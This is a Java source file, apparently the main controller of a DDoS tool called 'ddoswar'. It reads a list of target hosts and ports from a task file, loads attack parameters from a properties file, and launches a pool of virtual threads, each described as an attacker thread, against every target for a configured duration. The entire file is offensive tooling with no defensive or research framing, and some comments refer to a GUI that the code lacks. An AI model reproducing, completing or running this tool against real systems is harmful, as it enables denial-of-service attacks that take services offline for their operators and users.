package ua.cc.lajdev.ddoswar;

import ua.cc.lajdev.ddoswar.utils.FileParser;

import java.text.SimpleDateFormat;
import java.time.LocalDateTime;
import java.util.List;
import java.util.Map;
import java.util.Properties;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

/**
 * This is the GUI and all settings for the attack will
 * be defined in this class.
 */
public class DDOSer {

    /**
     * This is is the threadpool for all the DDOS-Attack threads.
     * Every attacking thread will be saved in there.
     */
    private ExecutorService threadPool;

    /**
     * Pattern for the DDOS.
     * Is like the model for the GUI. Or a configuration.
     */
    private DDOSPattern ddosPattern;

    /**
     * Duration of the Distributed Denial of Service (in seconds).
     */
    private int duration;

    /**
     * Decides if the threads should stop.
     * false = threads shouldn´t stop
     * true = threads should stop
     */
    public boolean stopThread = false;

    /**
     * This thread checks
     */
    private TimeChecker timeChecker;

    private static Properties properties;

    static {
        properties = FileParser.parseProperties();
    }

    private String hostName;
    private int port;

    /**
     * Creates new form ua.cc.lajdev.ddoswar.DDOSer
     *
     * @param hostName
     * @param port
     */
    public DDOSer(String hostName, int port) {
        this.hostName = hostName;
        this.port = port;
        startAll();
    }

    private void createPattern() {
        ddosPattern = new DDOSPattern();
        ddosPattern.setHost(hostName);
        ddosPattern.setProtocol(properties.getProperty("protocol"));
        ddosPattern.setPort(port);
        ddosPattern.setThreads(Integer.parseInt(properties.getProperty("threads")));
        ddosPattern.setMessage(properties.getProperty("message"));
        ddosPattern.setHours(Integer.parseInt(properties.getProperty("hours")));
        ddosPattern.setMinutes(Integer.parseInt(properties.getProperty("minutes")));
        ddosPattern.setSeconds(Integer.parseInt(properties.getProperty("seconds")));
        ddosPattern.setTimeout(Integer.parseInt(properties.getProperty("timeout")));
        ddosPattern.setSocketTimeout(Integer.parseInt(properties.getProperty("socketTimeout")));
    }

    /**
     * This method is responsible for adding new
     * text to the console of the GUI. (JTextField on the bottom of the GUI)
     *
     * @param message
     */
    public static void appendToConsole(String message) {
        LocalDateTime date = LocalDateTime.now();
        StringBuilder sb = new StringBuilder(date.toString());
        sb.append(" ").append(message).append("\n");
        System.out.println(sb);
    }

    /**
     * Start the whole DDOS process.
     */
    private void startAll() {
        stopThread = false;
        createPattern();
        duration = (ddosPattern.getHours() * 3600) + (ddosPattern.getMinutes() * 60) + (ddosPattern.getSeconds());
        if (duration > 0) {
            threadPool = Executors.newVirtualThreadPerTaskExecutor();
            for (int i = 0; i < ddosPattern.getThreads(); i++) {
                // add a new attacker thread to the threadpool
                threadPool.submit(DdosFactory.createDDOS(ddosPattern, this));
            }
            timeChecker = new TimeChecker();
            timeChecker.start();
        } else {
            System.out.println("Time must be greater than 0 seconds!");
        }
    }

    /**
     * This method stops the whole DDOS process.
     */
    private void stopAll() {
        if (timeChecker != null) timeChecker.interrupt();
        stopThread = true;
        if (threadPool != null) threadPool.shutdownNow();
        threadPool = null;
    }

    /**
     * Checks if it´s time to stop all threads.
     */
    class TimeChecker extends Thread {

        @Override
        public void run() {
            while (!isInterrupted() && !stopThread && duration > 0) {
                try {
                    duration -= 1;
                    Thread.sleep(1000);
                } catch (InterruptedException ex) {
//                    interrupt();
//                    stopThread = true;
                    duration = 0;
                    System.out.println("TimeChecker Stopped.");
                    break;
                }
            }
            stopAll();
        }
    }

    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        Map<String, List<Integer>> hostNames = FileParser.parseTask("conf/task.txt");

        System.out.println("Attacking.");
        for (String hostName : hostNames.keySet()) {
            for (int port : hostNames.get(hostName)) {
                new DDOSer(hostName, port);
            }
        }
    }
}
